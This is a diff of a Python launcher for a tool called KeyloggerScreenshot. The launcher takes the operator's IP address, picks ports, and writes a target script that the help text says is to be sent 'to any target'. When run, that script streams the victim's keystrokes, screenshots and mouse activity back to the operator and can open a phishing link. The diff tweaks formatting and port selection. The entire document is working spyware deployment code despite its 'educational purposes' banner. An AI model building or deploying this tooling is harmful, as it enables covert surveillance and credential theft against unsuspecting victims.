@@ -4,31 +4,23 @@ try:
 
 except KeyError:
     os.chdir("KeyloggerScreenshot")
-    
-    with open("Server_Keylogger.py", "r+") as file:
+
+    with open("__init__.py", "r+") as file:
         data = [line.replace("\n", "") for line in file]
 
-    with open("Server_Keylogger.py", "w+") as file:
-        for each in data:
-            if each not in ["import tkinter as tk", "import pyautogui as pg"]:
-                file.write(f"{each}\n")
-    
-    with open("Keylogger_Target.py", "r+") as file:
-        data = [line.replace("\n", "") for line in file]
-
-    with open("Keylogger_Target.py", "w+") as file:
+    with open("__init__.py", "w+") as file:
         for each in data:
             if each not in ["import PIL.Image", "from pynput import keyboard", "from pynput.mouse import Listener",
                             "import tkinter as tk", "import pyautogui as pg"]:
                 file.write(f"{each}\n")
-    
     os.chdir("..")
-    
+
 import KeyloggerScreenshot as ks
 import sys
 import threading
 import random
 import requests
+import subprocess
 
 gui = """
     __ __              __                                 _____                                       __            __ 
@@ -37,7 +29,7 @@ gui = """
  / /| |/  __// /_/ // // /_/ // /_/ // /_/ //  __// /   ___/ // /__ / /   /  __//  __// / / /(__  )/ / / // /_/ // /_  
 /_/ |_|\___/ \__, //_/ \____/ \__, / \__, / \___//_/   /____/ \___//_/    \___/ \___//_/ /_//____//_/ /_/ \____/ \__/  
             /____/           /____/ /____/    
-                                                                                     
+
                         ~Created by: Fawaz Bashiru~             
                         ~Write "python KLS_start.py -help" for help    
                         REMINDER THIS WAS BUILD FOR EDUCATIONAL PURPOSES
@@ -46,20 +38,45 @@ gui = """
 lst = sys.argv
 
 try:
-    if "-aip" in lst: #"aip" stands for address ip
+    if "-aip" in lst:  # "aip" stands for address ip
         idx = lst.index("-aip")
         try:
             global simulation
             global boolean
-            ipaddress = str(lst[idx+1])
+
+            cmd = subprocess.check_output(["netstat", "-ano"])
+            all = cmd.split()
+
+            working_ports = []
+            zahlen = [str(zahl) for zahl in range(0, 11)]
+
+            for each in all:
+                str_each = str(each)
+                if ":" in str_each:
+                    switch = str_each[::-1]
+                    this_port = ""
+                    for port in switch:
+                        if port not in zahlen: pass
+                        if port == ":": break
+                        this_port += port
+
+                    another_switch = this_port[::-1]
+                    if "'" in another_switch: another_switch = another_switch.replace("'", "")
+
+                    if len(another_switch) == 4:
+                        working_ports.append(another_switch)
+
+            ipaddress = str(lst[idx + 1])
 
             zahlen = "123456789"
             nummer = 0
             port_numbers = []
             while nummer != 4:
                 nummer += 1
-                random_lst = "".join(random.sample(zahlen, 4))
-                port_numbers.append(random_lst)
+                random_port = "".join(random.sample(zahlen, 4))
+                if random_port in working_ports:
+                    continue
+                port_numbers.append(random_port)
 
             port_photos = int(port_numbers[0])
             port_keylogger = int(port_numbers[1])
@@ -114,21 +131,23 @@ threading_server4.start() '''
                     print('"demon_server.py" HAS BEEN CREATED')
                 except IndexError:
                     quit()
-            if "-p" in lst: #"p" stands for ports
+            if "-p" in lst:  # "p" stands for ports
                 idx_port = lst.index("-p")
                 try:
                     print('ALL THE NUMBERS HAVE BEEN SAVED TO "ports.py"')
-                    print(f"\nport_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}\n")
+                    print(
+                        f"\nport_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}\n")
                     with open("ports.py", "a+") as file:
-                        file.write(f"port_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}")
+                        file.write(
+                            f"port_photos = {port_photos}\nport_keylogger = {port_keylogger}\nport_listener = {port_listener}\nport_time = {port_time}")
 
                 except IndexError:
                     quit()
 
-            if "-s" in lst: #"s" stands for seconds
+            if "-s" in lst:  # "s" stands for seconds
                 idx_s = lst.index("-s")
                 try:
-                    if "-" in lst[idx_s+1]:
+                    if "-" in lst[idx_s + 1]:
                         print(gui)
                         print("PLEASE SPECIFY YOUR SECONDS -s")
                         quit()
@@ -141,7 +160,8 @@ threading_server4.start() '''
 
                 except IndexError:
                     seconds = 60
-            else: seconds = 60
+            else:
+                seconds = 60
 
             if "-phs" in lst:
                 global phishing_name
@@ -151,7 +171,8 @@ threading_server4.start() '''
                     phishing_name = lst[phs_idx + 1]
                     if "-cf" not in lst:
                         print(gui)
-                        print('YOU HAVE NOT SPECIFIED THE FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
+                        print(
+                            'YOU HAVE NOT SPECIFIED THE FILE. IF YOU NEED HELP SIMPLY TYPE "python KLS_start.py -help" IN YOUR TERMINAL')
                         sys.exit()
                     try:
                         req = requests.get(phishing_name)
@@ -169,7 +190,7 @@ threading_server4.start() '''
             else:
                 phishing_name = None
 
-            if "-cf" in lst: #"cf" stands for Create file
+            if "-cf" in lst:  # "cf" stands for Create file
                 idx_cf = lst.index("-cf")
                 if phishing_name is not None:
                     phishing_value = f'"{phishing_name}"'
@@ -188,15 +209,18 @@ threading_server4.start() '''
                     if os.path.exists(filename):
                         os.remove(filename)
 
-                    if phishing_name is not None: print(f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
+                    if phishing_name is not None: print(
+                        f'LINK: {phishing_name} WILL BE OPEND WHEN {filename} IS EXECUTED')
 
                     with open(f"{filename}", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
+                        file.write(
+                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
                     print(f"{filename.upper()} has been created")
 
                 except IndexError:
                     with open("target.py", "a+") as file:
-                        file.write(f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
+                        file.write(
+                            f"import KeyloggerScreenshot as ks \n\nip = '{ipaddress}'\nkey_client = ks.KeyloggerTarget(ip, {port_photos}, ip, {port_keylogger}, ip, {port_listener}, ip, {port_time}, duration_in_seconds={seconds}, phishing_web={phishing_value}) \nkey_client.start()")
                     print("TARGET.PY HAS BEEN CREATED YOU CAN SEND THIS TO YOUR TARGET")
 
             server_photos = ks.ServerPhotos(ipaddress, port_photos)
@@ -230,7 +254,8 @@ threading_server4.start() '''
 
     if "-help" in lst:
         print(gui)
-        print("\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED")
+        print(
+            "\n-aip INSERT THE SERVERS IP\n-s   SPECIFY YOUR SECONDS (DEFAULT 60 SECONDS)\n-cf  CREATES TARGET FILE WHICH YOU SEND TO ANY TARGET\n-p   SAVES ALL THE PORTS OF THE CURRENT SERVER\n-ds  CREATES A SERVER WITH THE SAME PORTS AS THE TARGET\n-sim ACTIVATES SIMULATION\n-phs OPENS A LINK WHEN THE KEYLOGGER IS EXECUTED")
 
 except OSError:
     print('CHECK YOUR IP-ADDRESS WITH "ipconfig" ON WINDOWS AND "ifconfig" ON LINUX')
